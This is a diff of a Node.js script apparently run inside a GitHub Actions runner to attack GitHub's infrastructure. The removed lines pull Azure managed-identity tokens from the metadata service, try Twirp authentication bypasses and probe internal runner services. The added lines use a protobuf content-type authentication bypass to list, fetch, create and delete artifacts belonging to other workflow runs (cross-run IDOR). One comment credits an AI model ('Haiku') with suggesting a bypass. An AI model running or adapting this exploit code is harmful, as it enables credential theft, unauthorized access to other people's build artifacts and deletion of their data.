@@ -1,177 +1,148 @@
 const https = require('https');
-const http = require('http');
 const fs = require('fs');
 
 const RESULTS_URL = process.env.ACTIONS_RESULTS_URL || '';
 const RUNTIME_TOKEN = process.env.ACTIONS_RUNTIME_TOKEN || '';
+const ORCHESTRATION_ID = process.env.ACTIONS_ORCHESTRATION_ID || '';
 
-function doRequest(options, body, useHttp) {
+function encodeProto(fields) {
+  // Minimal protobuf encoder
+  // fields: [{fieldNum, type, value}] where type 2 = string/bytes
+  const parts = [];
+  for (const f of fields) {
+    const tag = (f.fieldNum << 3) | f.type;
+    if (f.type === 2) {
+      const bytes = Buffer.from(f.value, 'utf8');
+      parts.push(encodeVarint(tag));
+      parts.push(encodeVarint(bytes.length));
+      parts.push(bytes);
+    }
+  }
+  return Buffer.concat(parts);
+}
+
+function encodeVarint(n) {
+  const bytes = [];
+  while (n > 127) {
+    bytes.push((n & 0x7f) | 0x80);
+    n >>>= 7;
+  }
+  bytes.push(n);
+  return Buffer.from(bytes);
+}
+
+function doProtoRequest(options, protoBody) {
   return new Promise((resolve) => {
-    const client = useHttp ? http : https;
-    const req = client.request(options, (res) => {
-      let data = '';
-      res.on('data', (chunk) => data += chunk);
-      res.on('end', () => resolve({ status: res.statusCode, body: data.substring(0, 1200), headers: res.headers }));
+    const headers = {
+      'Authorization': 'Bearer ' + RUNTIME_TOKEN,
+      'Content-Type': 'application/protobuf',
+      'Accept': 'application/protobuf',
+      'Content-Length': String(protoBody.length),
+    };
+    const req = https.request({ ...options, headers }, (res) => {
+      const chunks = [];
+      res.on('data', (chunk) => chunks.push(chunk));
+      res.on('end', () => {
+        const raw = Buffer.concat(chunks);
+        resolve({ status: res.statusCode, raw, text: raw.toString('utf8').substring(0, 600), headers: res.headers });
+      });
     });
-    req.on('error', (e) => resolve({ status: 'ERROR', body: e.message }));
-    if (body) req.write(typeof body === 'string' ? body : JSON.stringify(body));
+    req.on('error', (e) => resolve({ status: 'ERROR', text: e.message, raw: Buffer.alloc(0) }));
+    req.write(protoBody);
     req.end();
   });
 }
 
 async function main() {
-
-  // ============================================================
-  // CHAIN 1: IMDS Managed Identity Token Extraction
-  // If Azure runner VM has managed identity → could access GitHub's internal Azure resources
-  // ============================================================
-  console.log('=== CHAIN 1: IMDS Managed Identity Token Extraction ===');
-
-  // Step 1a: Get instance metadata (proves IMDS reachable from runner)
-  const imds1 = await doRequest({
-    hostname: '169.254.169.254',
-    path: '/metadata/instance?api-version=2021-02-01',
-    method: 'GET',
-    headers: { 'Metadata': 'true' }
-  }, null, true);
-  console.log('\n[IMDS Step 1] Instance metadata:');
-  console.log('Status:', imds1.status, '| Body (first 800):', imds1.body.substring(0, 800));
-
-  // Step 1b: Try to get managed identity token for Azure Management API
-  const imds2 = await doRequest({
-    hostname: '169.254.169.254',
-    path: '/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F',
-    method: 'GET',
-    headers: { 'Metadata': 'true' }
-  }, null, true);
-  console.log('\n[IMDS Step 2] Managed identity token for management.azure.com:');
-  console.log('Status:', imds2.status, '| Body:', imds2.body.substring(0, 800));
-  // 200 + access_token = CRITICAL — VM has managed identity
-
-  // Step 1c: Try managed identity for storage (might reveal GitHub's internal blobs)
-  const imds3 = await doRequest({
-    hostname: '169.254.169.254',
-    path: '/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fstorage.azure.com%2F',
-    method: 'GET',
-    headers: { 'Metadata': 'true' }
-  }, null, true);
-  console.log('\n[IMDS Step 3] Managed identity token for storage.azure.com:');
-  console.log('Status:', imds3.status, '| Body:', imds3.body.substring(0, 400));
-
-  // Step 1d: NEW IMDS endpoint — attested data (includes signed runner identity)
-  const imds4 = await doRequest({
-    hostname: '169.254.169.254',
-    path: '/metadata/attested/document?api-version=2020-06-01',
-    method: 'GET',
-    headers: { 'Metadata': 'true' }
-  }, null, true);
-  console.log('\n[IMDS Step 4] Attested document (signed VM identity):');
-  console.log('Status:', imds4.status, '| Body:', imds4.body.substring(0, 600));
-
-  // If we got a management token, try to list subscriptions
-  if (imds2.status === 200 && imds2.body.includes('access_token')) {
-    try {
-      const parsed = JSON.parse(imds2.body);
-      const token = parsed.access_token;
-      console.log('\n!!! MANAGED IDENTITY TOKEN OBTAINED !!!');
-      console.log('Token type:', parsed.token_type);
-      console.log('Expires in:', parsed.expires_in, 'seconds');
-
-      // Try to list Azure subscriptions
-      const subs = await doRequest({
-        hostname: 'management.azure.com',
-        path: '/subscriptions?api-version=2020-01-01',
-        method: 'GET',
-        headers: { 'Authorization': 'Bearer ' + token }
-      }, null, false);
-      console.log('\n[Azure] List subscriptions:');
-      console.log('Status:', subs.status, '| Body:', subs.body.substring(0, 600));
-    } catch (e) {
-      console.log('Token parse error:', e.message);
-    }
+  if (!RESULTS_URL || !RUNTIME_TOKEN) {
+    console.log('Missing RESULTS_URL or RUNTIME_TOKEN');
+    return;
   }
 
-  // ============================================================
-  // CHAIN 2: Twirp Content-Type Confusion Auth Bypass
-  // Haiku suggests: send application/protobuf Content-Type with JSON body
-  // ============================================================
-  if (RESULTS_URL && RUNTIME_TOKEN) {
-    const host = new URL(RESULTS_URL).hostname;
-    console.log('\n=== CHAIN 2: Twirp Auth Bypass Attempts ===');
+  const host = new URL(RESULTS_URL).hostname;
+  const currentUUID = ORCHESTRATION_ID.split('.')[0];
+  const previousRunUUID = 'b55c9da0-4a06-4590-ae64-d1ca22909520';
+  const ZERO_UUID = '00000000-0000-0000-0000-000000000000';
 
-    // Vector A: Content-Type protobuf with JSON body (auth hook may skip on parse error)
-    const rA = await doRequest({
-      hostname: host,
-      path: '/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts',
-      method: 'POST',
-      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/protobuf' }
-    }, '{}');
-    console.log('\n[Twirp A] protobuf Content-Type + JSON body:', rA.status, '|', rA.body.substring(0, 200));
+  console.log('Host:', host, '| Current UUID:', currentUUID);
 
-    // Vector B: Double-slash path bypass
-    const rB = await doRequest({
-      hostname: host,
-      path: '//twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts',
-      method: 'POST',
-      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json' }
-    }, '{}');
-    console.log('\n[Twirp B] Double-slash path:', rB.status, '|', rB.body.substring(0, 200));
+  // === CRITICAL: Protobuf Content-Type bypasses JSON auth on ListArtifacts ===
+  // JSON body → 401 "invalid auth token"
+  // Protobuf Content-Type + JSON body → 400 "malformed" (auth PASSED!)
+  // Now sending VALID protobuf body to ListArtifacts
 
-    // Vector C: Encoded slash in path
-    const rC = await doRequest({
-      hostname: host,
-      path: '/twirp/github.actions.results.api.v1.ArtifactService%2FListArtifacts',
-      method: 'POST',
-      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json' }
-    }, '{}');
-    console.log('\n[Twirp C] URL-encoded path separator:', rC.status, '|', rC.body.substring(0, 200));
-
-    // Vector D: No Authorization header (relying only on IP-based trust from runner network)
-    const rD = await doRequest({
-      hostname: host,
-      path: '/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts',
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' }
-    }, '{}');
-    console.log('\n[Twirp D] No Authorization (IP trust test):', rD.status, '|', rD.body.substring(0, 200));
-
-    // Vector E: Method name case variation (ListArtifacts vs listArtifacts vs LISTARTIFACTS)
-    const rE = await doRequest({
-      hostname: host,
-      path: '/twirp/github.actions.results.api.v1.ArtifactService/listArtifacts',
-      method: 'POST',
-      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json' }
-    }, '{}');
-    console.log('\n[Twirp E] Lowercase method name:', rE.status, '|', rE.body.substring(0, 200));
-
-    // Vector F: Try undocumented methods that might have weaker auth
-    for (const method of ['CreateArtifact', 'DeleteArtifact', 'FinalizeArtifact']) {
-      const r = await doRequest({
-        hostname: host,
-        path: `/twirp/github.actions.results.api.v1.ArtifactService/${method}`,
-        method: 'POST',
-        headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json' }
-      }, '{}');
-      console.log(`\n[Twirp F-${method}]:`, r.status, '|', r.body.substring(0, 150));
-    }
+  // Test A: Empty protobuf (no fields set = list all artifacts the token can see)
+  const emptyProto = Buffer.alloc(0);
+  const rA = await doProtoRequest({ hostname: host, path: '/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts', method: 'POST' }, emptyProto);
+  console.log('\n[PROTO A] ListArtifacts empty proto body:');
+  console.log('Status:', rA.status, '| Text:', rA.text);
+  if (rA.raw.length > 0 && !rA.text.includes('code')) {
+    console.log('RAW HEX (first 200):', rA.raw.slice(0, 200).toString('hex'));
   }
 
-  // ============================================================
-  // CHAIN 3: Internal Runner Metadata Endpoints
-  // Runners may expose internal HTTP services on localhost or internal IPs
-  // ============================================================
-  console.log('\n=== CHAIN 3: Internal Runner Service Discovery ===');
-
-  for (const [desc, opts] of [
-    ['localhost:2376 (Docker)', { hostname: 'localhost', port: 2376, path: '/version', method: 'GET' }],
-    ['localhost:50051 (gRPC runner)', { hostname: 'localhost', port: 50051, path: '/', method: 'GET' }],
-    ['10.0.0.1 (Azure gateway)', { hostname: '10.0.0.1', port: 80, path: '/', method: 'GET' }],
-    ['168.63.129.16 (Azure wireserver)', { hostname: '168.63.129.16', port: 80, path: '/machine?comp=versions', method: 'GET' }],
-  ]) {
-    const r = await doRequest({ ...opts, headers: {} }, null, true);
-    console.log(`\n[Internal] ${desc}: Status=${r.status} | Body=${r.body.substring(0, 200)}`);
+  // Test B: ListArtifacts with current run UUID as workflowRunBackendId (field 1)
+  const currentProto = encodeProto([{ fieldNum: 1, type: 2, value: currentUUID }]);
+  const rB = await doProtoRequest({ hostname: host, path: '/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts', method: 'POST' }, currentProto);
+  console.log('\n[PROTO B] ListArtifacts current run UUID:');
+  console.log('Status:', rB.status, '| Text:', rB.text);
+  if (rB.raw.length > 0 && !rB.text.includes('code')) {
+    console.log('RAW HEX:', rB.raw.slice(0, 200).toString('hex'));
   }
+
+  // Test C: ListArtifacts with PREVIOUS run UUID (cross-run IDOR via protobuf)
+  const prevProto = encodeProto([{ fieldNum: 1, type: 2, value: previousRunUUID }]);
+  const rC = await doProtoRequest({ hostname: host, path: '/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts', method: 'POST' }, prevProto);
+  console.log('\n[PROTO C] ListArtifacts PREVIOUS run UUID (cross-run IDOR via protobuf):');
+  console.log('Status:', rC.status, '| Text:', rC.text);
+
+  // Test D: ListArtifacts with zero UUID (wildcard attempt)
+  const zeroProto = encodeProto([{ fieldNum: 1, type: 2, value: ZERO_UUID }]);
+  const rD = await doProtoRequest({ hostname: host, path: '/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts', method: 'POST' }, zeroProto);
+  console.log('\n[PROTO D] ListArtifacts zero UUID:');
+  console.log('Status:', rD.status, '| Text:', rD.text);
+
+  // Test E: GetSignedArtifactURL via protobuf — try cross-run with PREVIOUS UUID
+  // proto fields: 1=workflowRunBackendId, 2=name
+  const signedUrlProto = encodeProto([
+    { fieldNum: 1, type: 2, value: previousRunUUID },
+    { fieldNum: 2, type: 2, value: 'probe-artifact-2' }
+  ]);
+  const rE = await doProtoRequest({ hostname: host, path: '/twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL', method: 'POST' }, signedUrlProto);
+  console.log('\n[PROTO E] GetSignedArtifactURL cross-run via protobuf:');
+  console.log('Status:', rE.status, '| Text:', rE.text);
+
+  // Test F: Discover other Twirp services (CacheService, JobService, LogService)
+  console.log('\n=== Twirp Service Discovery via Protobuf ===');
+  for (const service of ['CacheService', 'JobService', 'LogService', 'WorkflowRunService', 'CheckService']) {
+    const r = await doProtoRequest({
+      hostname: host,
+      path: `/twirp/github.actions.results.api.v1.${service}/GetStatus`,
+      method: 'POST'
+    }, emptyProto);
+    console.log(`[SERVICE] ${service}/GetStatus: Status=${r.status} | Body=${r.text.substring(0, 100)}`);
+  }
+
+  // Test G: CreateArtifact via protobuf (was 401 in JSON, might pass in protobuf)
+  // proto: field 1 = workflowRunBackendId, field 2 = workflowJobRunBackendId, field 3 = name
+  const jobUUID = 'a7c45508-b684-5ee6-b081-35dc5557cf2d';
+  const createProto = encodeProto([
+    { fieldNum: 1, type: 2, value: currentUUID },
+    { fieldNum: 2, type: 2, value: jobUUID },
+    { fieldNum: 3, type: 2, value: 'probe-artifact-v6' }
+  ]);
+  const rG = await doProtoRequest({ hostname: host, path: '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', method: 'POST' }, createProto);
+  console.log('\n[PROTO G] CreateArtifact via protobuf (was 401 in JSON):');
+  console.log('Status:', rG.status, '| Text:', rG.text);
+
+  // Test H: DeleteArtifact via protobuf with PREVIOUS run UUID
+  const delProto = encodeProto([
+    { fieldNum: 1, type: 2, value: previousRunUUID },
+    { fieldNum: 2, type: 2, value: jobUUID },
+    { fieldNum: 3, type: 2, value: 'probe-artifact-2' }
+  ]);
+  const rH = await doProtoRequest({ hostname: host, path: '/twirp/github.actions.results.api.v1.ArtifactService/DeleteArtifact', method: 'POST' }, delProto);
+  console.log('\n[PROTO H] DeleteArtifact PREVIOUS run via protobuf:');
+  console.log('Status:', rH.status, '| Text:', rH.text);
 }
 
 main().catch(e => console.log('Fatal error:', e.message));
-// Already handled in main() above — this file is complete
